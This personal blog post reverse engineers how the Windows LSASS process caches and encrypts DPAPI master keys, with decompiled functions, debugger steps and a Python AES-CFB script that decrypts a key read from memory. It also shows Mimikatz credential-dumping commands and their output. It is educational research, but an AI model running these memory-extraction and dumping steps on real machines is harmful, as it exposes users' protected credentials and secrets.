---
author: "fly"
---
## Reverse engineering LSASS to decrypt DPAPI keys
Before you start reading this post I'd like to point out that this is not a practical technique, no sane person would manually hunt for DPAPI blobs and decryption keys during an assessment - in fact, this is not a "technique" at all, the post is meant to showcase how LSASS handles DPAPI keys under the hood.
With that out of the way, carry on ʕ •ᴥ•ʔ

---

When it comes to DPAPI master keys, we often think of the `%APPDATA%\Microsoft\Protect\{SID}` folder for user keys or the `%WINDIR%\System32\Microsoft\Protect\S-1-5-18` folder for system keys

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252F4iCS8rt2ORcOhshBjs6r%252Fimage.png%3Falt%3Dmedia%26token%3Dea2a91c7-f05f-4caf-9ae8-ac5a710061b5&width=768&dpr=1&quality=100&sign=437e75bff88f4b5cc2da449ff7811ce5527048e8db0fc3b4a58945d2a64329b4)
![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FYEmf1i7fx1r3WWKFeFpW%252Fimage.png%3Falt%3Dmedia%26token%3D91781fc0-6ed2-4d1e-96d5-a0b0fdf98496&width=768&dpr=1&quality=100&sign=4e13450182a201540015069052d3e587549e1e9bf28d0ec897dade5449bb05dd)

but the keys are also cached as encrypted blobs in the `lsass` process.

These keys can be opened into a hex editor like HxD and we can see that the GUID of the key is placed at the very top
[center]
![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252F8jqj4a1NHSYEMn6rZEDB%252Fimage.png%3Falt%3Dmedia%26token%3Deaee77ef-9b0e-42cf-93bb-8a2fd43fac09&width=768&dpr=1&quality=100&sign=cf458585b58d3bd68a72d8306139004a4fd04ea65023393713057e6b5fe9799d)
[/center]

To examine the rest of the parameters we could find how data is organized and extract the rest of the information; during my research, I found [this](https://www.passcape.com/windows_password_recovery_dpapi_master_key) post that conveniently lists all the attributes contained inside a DPAPI master key

1. `dwLocalEncKeySiz`: current slot length
2. `dwVersion`: data structure version
3. `pSalt`: salt
4. `dwPBKDF2IterationCount`: iterations in the PBKDF2 encryption key generation function
5. `HMACAlgId`: hashing algorithm identifier
6. `CryptAlgId`: encryption algorithm used
7. `pKey`: encrypted Local Encryption Key, used for decrypting Local Backup Key in Windows 2000

We can also use the [tool](https://download.cnet.com/windows-password-recovery/3000-2094_4-75416091.html?ex=RAMP-2070.0) from the post to view these attributes

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FLhWiyNBBgvAO96EC171A%252Fimage.png%3Falt%3Dmedia%26token%3Daa667204-0dcd-4d44-9237-99bbbaefcb58&width=768&dpr=1&quality=100&sign=c1dae4d24a2b196d758f3a95bd773d56260a03a5aa4fb37764b5e758262317d9)

After checking out the demo version of the tool I opened `x64dbg` and attached a debugger to the `lsass.exe` process to see what DLLs are loaded into it and their symbols and found what seemed to be the library responsible for handling the cached master keys: `dpapisrv.dll` and its `MasterKeyCacheList` function.

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FRwJgVLwqqShJN2ItZVe7%252Fimage.png%3Falt%3Dmedia%26token%3D09416e7e-8052-4f66-a630-e776c246444e&width=768&dpr=1&quality=100&sign=33ce264c92fe23b9d2b27aca0174f524931a20c39d8962abb904fd632d876dc1)

> [!Danger]
> Attaching a debugger to the LSASS process might cause the system to reboot

So we can open the DLL in IDA64 and take a closer look: while I didn't find the `MasterKeyCacheList` function in the DLLs functions, I found references to it in other functions like `FindMasterKeyEntry`

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252Fc8RCtF5fghpXatM2LjHJ%252Fimage.png%3Falt%3Dmedia%26token%3Df86ecdda-c370-449b-86cd-a6ba5fc4a4e5&width=768&dpr=1&quality=100&sign=8f5c22689032b86bfd58a1e498da3041653b31867851bef354ae314af9c15295)

The `g_MasterKeyCacheList` only gets referenced in the following functions
```
FindMasterKeyEntry
InsertMasterKeyCache
DPAPIInitialize
DeleteKeyCache
```
and since I'm focusing on extracting already existing keys, I focused on the `FindMasterKeyEntry` function and tried to reverse its functionality to see if it does anything interesting: I'm not a master at RE so take this with a grain of salt, also I think IDA might have messed up some of the logic but this is enough to get a general idea of what the function does
```cpp
HLOCAL *__fastcall FindMasterKeyEntry(
        struct _LIST_ENTRY *cacheList,
        const unsigned __int16 *keyIndentifier,
        struct _LUID *userIdentifier,
        struct _GUID *masterKeyGuid)
{
  HLOCAL *currentEntry;
  HLOCAL *foundEntry;
  __int64 guidDifference;
  const unsigned __int16 *currentKeyId;
  int currentKeyIdChar;
  int comparisonResult;

  // initialize the head of the master key cache list
  currentEntry = (HLOCAL *)g_MasterKeyCacheList;
  // set found entry pointer to nullptr
  foundEntry = 0i64;
  // loop through the cache list                            
  while ( currentEntry != &g_MasterKeyCacheList )
  {
    // check if a GUID is provided
    if ( masterKeyGuid )
    {
      // compare the GUIDs
      guidDifference = *(_QWORD *)&masterKeyGuid->Data1 - (_QWORD)currentEntry[3];
      if ( *(HLOCAL *)&masterKeyGuid->Data1 == currentEntry[3] )
        guidDifference = *(_QWORD *)masterKeyGuid->Data4 - (_QWORD)currentEntry[4];
      // if the difference between the GUIDs is not 0 (the GUIDs are not the same)
      // continue to the next entry
      if ( guidDifference )
        goto NEXT_CACHE_ENTRY;
    }
    // check if user and key identifiers are provided
    if ( !userIdentifier )
    {
      if ( !keyIndentifier )
        goto FOUND_CACHE_ENTRY;
// compare key identifiers
COMPARE_KEY_IDENTIFIERS:
      currentKeyId = keyIndentifier;
      do
      {
        currentKeyIdChar = *(const unsigned __int16 *)((char *)currentKeyId
                                                     + (_BYTE *)currentEntry[15]
                                                     - (_BYTE *)keyIndentifier);
        comparisonResult = *currentKeyId - currentKeyIdChar;
        if ( comparisonResult )
          break;
        ++currentKeyId;
      }
      while ( currentKeyIdChar );
      if ( !comparisonResult )
      {
FOUND_CACHE_ENTRY:
        // update the last access time attribute
        // and return the found entry
        // (this is only called if a matching entry is found)
        foundEntry = currentEntry;
        GetSystemTimeAsFileTime((LPFILETIME)currentEntry + 5);
        return foundEntry;
      }
      goto NEXT_CACHE_ENTRY;
    }
    // check if the user identifier matches the current entry
    if ( *((_DWORD *)currentEntry + 5) == userIdentifier->HighPart
      && *((_DWORD *)currentEntry + 4) == userIdentifier->LowPart )
    {
      goto FOUND_CACHE_ENTRY;
    }
    if ( keyIndentifier )
      goto COMPARE_KEY_IDENTIFIERS;
NEXT_CACHE_ENTRY:
    // move to the next entry
    currentEntry = (HLOCAL *)*currentEntry;
  }
  return foundEntry;
}
```

In summary, the function searches a list of cached entries for a specific Data Protection API (DPAPI) key. It can use different criteria to find the key:
1. Master Key GUID: searches for an entry with a matching GUID (unique identifier)
2. User Identifier: searches for an entry associated with a specific user account
3. Key Identifier: searches for an entry with a matching key identifier string

*Based on the reversed code, one or more of these three attributes might not be present.*

If we now switch back to debugging the LSASS process we can go to the address of the `FindMasterKeyEntry` function and see the values in memory of  `g_MasterKeyCacheList`; as we can see from the image above, the cache list starts with the System Keys as the first 16 bytes are the name of the fist System Key in Little Endian format

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FNqRvOhWdYFvS1MBqg08i%252Fimage.png%3Falt%3Dmedia%26token%3Dc35cd2b4-030c-4c7b-8e2f-421dbe41e89c&width=768&dpr=1&quality=100&sign=b93f709e2ad216d901160c915048e6ce5e1c48b19c71e6ed340497a23ad9b13f)

With a quick search on the Mimikatz Github repo, we can find [this](https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.h) header file which contains the complete structure of the cache entry
```cpp
typedef struct _KIWI_MASTERKEY_CACHE_ENTRY {
	struct _KIWI_MATERKEY_CACHE_ENTRY *Flink;
	struct _KIWI_MATERKEY_CACHE_ENTRY *Blink;
	LUID LogonId;
	GUID KeyUid;
	FILETIME insertTime;
	ULONG keySize;
	BYTE  key[ANYSIZE_ARRAY];
} KIWI_MASTERKEY_CACHE_ENTRY, *PKIWI_MASTERKEY_CACHE_ENTRY;
```
and we're able to find the 4 bytes that represent the length of the key; the value is `40 00 00 00` so the encrypted value of the key will be 40 bytes long and it's represented by the section highlighted in light gray.

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FvxGNNRj7rULMjPCuoxwC%252Fimage.png%3Falt%3Dmedia%26token%3Dff5b63a6-a09e-4955-9a4d-227cd330abed&width=768&dpr=1&quality=100&sign=0b75e0ca6521e95aca38f56dadbf1e89bb8738cb2c763a4ef76c08a6c2d044b7)

Now it's time to find out how the key is encrypted and decrypt it: since Windows Vista, the entries for the Master Key cache are encrypted with AES-256 in CFB mode so we should be able to retrieve the IV and key from somewhere in memory.

To find this information I repeated the same steps as before: loaded LSASS in a debugger, looked at the symbols and tried to find functions related to the key's encryption.
Doing so I found the `lsasrv.dll` library which contained symbols like `InitializationVector`, `aesKey` and `LspAES256DecryptData` so I opened it in IDA.

When it comes to the AES key used for encryption and decryption we can simply look at the `hAesKey@@3PEAXEA` symbol and look at where the value is referenced to find the original `hAESKey` value in the `LsaInitializeProtectedMemory` function

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252F1dzWwIYCIBdze6LFxjaP%252Fimage.png%3Falt%3Dmedia%26token%3D1d53d413-30d2-4d40-8a62-a0e17d03b237&width=768&dpr=1&quality=100&sign=5a7367078ea91150a4ca0633fb79d63ec51ef21b2c90538d91bc6fda558c500d)

We can also reverse said function to understand better what it's doing and how the memory is initialized
```cpp
__int64 LsaInitializeProtectedMemory()
{
  NTSTATUS status;
  UCHAR *allocatedMemory3DES;
  UCHAR *allocatedMemoryAES;
  UCHAR *v3;
  DWORD lastError;
  ULONG resultSize;
  UCHAR outputLength3DES[4];
  UCHAR outputLengthAES[4];
  UCHAR randomBuffer[16];
  __int64 temp;

  // initialize all the needed buffers
  *(_DWORD *)outputLength3DES = 0;
  *(_DWORD *)outputLengthAES = 0;
  resultSize = 0;
  temp = 0i64;
  // open the 3DES crypto provider
  *(_OWORD *)randomBuffer = 0i64;               
  status = BCryptOpenAlgorithmProvider(&h3DesProvider, L"3DES", 0i64, 0);
  if ( status < 0 )
    goto CLEANUP_FUNCTION;
  // open the AES crypto provider
  status = BCryptOpenAlgorithmProvider(&hAesProvider, L"AES", 0i64, 0);
  if ( status < 0 )
    goto CLEANUP_FUNCTION;
  // set chaining mode to CBC for 3DES
  status = BCryptSetProperty(h3DesProvider, L"ChainingMode", (PUCHAR)L"ChainingModeCBC", 0x20u, 0);
  if ( status < 0 )
    goto CLEANUP_FUNCTION;
  // set chaining mode to CFB for AES
  status = BCryptSetProperty(hAesProvider, L"ChainingMode", (PUCHAR)L"ChainingModeCFB", 0x20u, 0);
  if ( status < 0 )
    goto CLEANUP_FUNCTION;
  resultSize = 4;
  // get the object length for 3DES
  status = BCryptGetProperty(h3DesProvider, L"ObjectLength", outputLength3DES, 4u, &resultSize, 0);
  if ( status < 0 )
    goto CLEANUP_FUNCTION;
  if ( resultSize == 4 )
  {
    resultSize = 4;
    // get the object length for AES
    status = BCryptGetProperty(hAesProvider, L"ObjectLength", outputLengthAES, 4u, &resultSize, 0);
    if ( status < 0 )
    {
CLEANUP_FUNCTION:
      LsaCleanupProtectedMemory();
      return (unsigned int)status;
    }
    if ( resultSize == 4 )
    {
      // calculate the total memory size required
      // for both 3DES and AES
      LODWORD(CredLockedMemorySize) = *(_DWORD *)outputLength3DES + *(_DWORD *)outputLengthAES;
      allocatedMemory3DES = (UCHAR *)VirtualAlloc(
                                       0i64,
                                       (unsigned int)(*(_DWORD *)outputLength3DES + *(_DWORD *)outputLengthAES),
                                       0x1000u,
                                       4u);
      // allocate said memory
      CredLockedMemory = allocatedMemory3DES;
      if ( allocatedMemory3DES && VirtualLock(allocatedMemory3DES, (unsigned int)CredLockedMemorySize) )
      {
        allocatedMemoryAES = CredLockedMemory;
        v3 = &CredLockedMemory[*(unsigned int *)outputLength3DES];
        // generate random bytes for AES key
        status = BCryptGenRandom(0i64, randomBuffer, 0x18u, 2u);
        if ( status < 0 )
          goto CLEANUP_FUNCTION;
        // generate AES key
        status = BCryptGenerateSymmetricKey(
                   h3DesProvider,
                   &h3DesKey,
                   allocatedMemoryAES,
                   *(ULONG *)outputLength3DES,
                   randomBuffer,
                   0x18u,
                   0);
        if ( status < 0 )
          goto CLEANUP_FUNCTION;
        status = BCryptGenRandom(0i64, randomBuffer, 0x10u, 2u);
        if ( status < 0 )
          goto CLEANUP_FUNCTION;
        // generate a random IV
        status = BCryptGenerateSymmetricKey(
                   hAesProvider,
                   &hAesKey,
                   v3,
                   *(ULONG *)outputLengthAES,
                   randomBuffer,
                   0x10u,
                   0);
        if ( status < 0 )
          goto CLEANUP_FUNCTION;
        status = BCryptGenRandom(0i64, &InitializationVector, 0x10u, 2u);
        if ( status < 0 )
          goto CLEANUP_FUNCTION;
        status = 0;
      }
      else
      {
        lastError = GetLastError();
        status = I_RpcMapWin32Status(lastError);
      }
    }
  }
  if ( status < 0 )
    goto CLEANUP_FUNCTION;
  return (unsigned int)status;
}
```

Now we know where the AES key is stored and how to retrieve it but we'll have to find where the IV is stored.

I tried looking at Mimikatz's source code again to see if I could quickly see where the IV is extracted from but to no avail (_I probably missed it_).
Opening the file I noticed there is no official PDB file for it 
```
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe" /v C:\Windows\System32\lsasrv.dll

...

SYMCHK: lsasrv.dll           FAILED  - lsasrv.pdb mismatched or not found

...
```

so I had to read it from [here](https://lise.pnfsoftware.com/winpdb/444113571DD057E724385B1CF1DCE3F2DEBA50D7257DECA49522BCD697560D1A-lsasrv.html): I just downloaded the raw HTML contents to the desktop (just skip the header), saved it to the desktop as `lsasrv.pdb` and IDA found the symbols as soon as I opened it up.

![](https://otter.gitbook.io/~gitbook/image?url=https%3A%2F%2F2250041043-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FwvcHfYovs3au5hl3NprD%252Fuploads%252FmcbObCWHEg5QXgG3DPmL%252Fimage.png%3Falt%3Dmedia%26token%3De16db049-66a8-45d2-8dc7-955b7cfd5144&width=768&dpr=1&quality=100&sign=02994520f8acd0cbc010f23ed71426c05a23e83a07e5a615aa9af05924089651)

Next up I looked for some of the symbols I mentioned starting from `InitializationVector` as it seemed a pretty good place to start looking; that symbol is only referenced by the `LsaEncryptMemory` and `LsaInitializeProtectedMemory` functions: this is the reversed code from `LsaEncryptMemory`
```cpp
void __fastcall LsaEncryptMemory(PUCHAR pbOutput, ULONG cbInput, int operation)
{
  // handle to the key used for encryption and decryption
  BCRYPT_KEY_HANDLE keyHandle;
  // size of the IV
  ULONG ivSize;
  // size of the encryption result
  ULONG resultSize; 
  // buffer for the IV (16 bytes)
  UCHAR ivBuffer[16]; 

  if ( pbOutput )
  {
    // set the value of the key handle to the
    // default 3DES key handle (???)
    keyHandle = h3DesKey;                       
                                                
    resultSize = 0;
    // default IV size for 3DES
    ivSize = 8;                                 
    if ( cbInput )
    {
      // copy the initialization vector
      // to the dedicated buffer
      *(_OWORD *)ivBuffer = *(_OWORD *)&InitializationVector;
      // check if the input size if a multiple of 8
      // if it is, use AES instead of 3DES             
      if ( (cbInput & 7) != 0 )                                                     
      {
        // set the value of the key handle
        // to the AES key
        keyHandle = hAesKey;
        // default IV size for AES                     
        ivSize = 16;                            
      }
      if ( operation )
      {
        // if operation == 1 : perform encryption
        // else              : perform decryption
        if ( operation == 1 )                   
          BCryptEncrypt(keyHandle, pbOutput, cbInput, 0i64, ivBuffer, ivSize, pbOutput, cbInput, &resultSize, 0);
      }
      else
      {
        BCryptDecrypt(keyHandle, pbOutput, cbInput, 0i64, ivBuffer, ivSize, pbOutput, cbInput, &resultSize, 0);
      }
    }
  }
}
```

This is a really valuable snippet of code: not only it shows how LSASS decides whether to use 3DES or AES, but it also gives us a direct reference to the `InitializationVector` that we can now read from memory by using a debugger (_light-gray highlighted text_)

The same process can be repeated for the 3DES key which is referenced in the `LsaEncryptMemory`.
**Now we have everything we need to decrypt the DPAPI master keys!**

It's possible to write a console application that gets a handle to the LSASS process, enumerates the base addresses of the `lsasrv.dll` and `dpapisrv.dll` libraries and extracts the needed values from memory to decrypt the key, but in this case I went with something simpler and wrote the following script: its functionality is pretty basic as it just uses the Python `Crypto` module to AES-CFB decrypt the encrypted key based on the IV and AES key values supplied by the user.
```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii

def decryptMasterKey(encrypted_master_key, aes_key, iv):
    cipher = AES.new(aes_key, AES.MODE_CFB, iv=iv)
    decrypted_master_key = cipher.decrypt(encrypted_master_key)
    
    return decrypted_master_key

if __name__ == "__main__":
    # replace these with the actual encrypted master key,
    # AES key, and IV found in memory 
    encrypted_master_key_hex = "<MASTER_KEY_HEX>"
    aes_key_hex = "<AES_KEY_HEX>"
    iv_hex = "<IV_HEX>"
    
    encrypted_master_key = binascii.unhexlify(encrypted_master_key_hex)
    aes_key = binascii.unhexlify(aes_key_hex)
    iv = binascii.unhexlify(iv_hex)
    
    decrypted_master_key = decryptMasterKey(encrypted_master_key, aes_key, iv)
    print("[~] Master Key:", binascii.hexlify(decrypted_master_key).decode())
```

To test this script, I decrypted the first entry in the master key cache list with GUID `5b31d113-c5ac-441e-bc2d-391de8323a5f` (the same one I documented above): this is the output of the Python script
```
python3 dpapiMaster.py
[~] Master Key: 1b12c4ef9cc58e5b79371243aacbeb47187267c45853a35936f8a85e4828ffac074ae0d62c39ced468d0f41c66077674a48b6cdebcf9a7a01f4b2d05e3494fab
```
and this is Mimikatz's output
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

616     {0;000003e7} 1 D 23011          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0001cb4c} 1 F 12026358    COMMANDO\otter  S-1-5-21-4130188456-627131244-1205667481-1000   (15g,25p)       Primary
 * Thread Token  : {0;000003e7} 1 D 12178278    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
mimikatz # sekurlsa::dpapi

...

[00000001]
         * GUID      :  {5b31d113-c5ac-441e-bc2d-391de8323a5f}
         * Time      :  6/21/2024 12:48:29 PM
         * MasterKey :  1b12c4ef9cc58e5b79371243aacbeb47187267c45853a35936f8a85e4828ffac074ae0d62c39ced468d0f41c66077674a48b6cdebcf9a7a01f4b2d05e3494fab
         * sha1(key) :  4f9b43dcdaede3547fcc55815eb10f1755033456
```

ʕ •ᴥ•ʔ
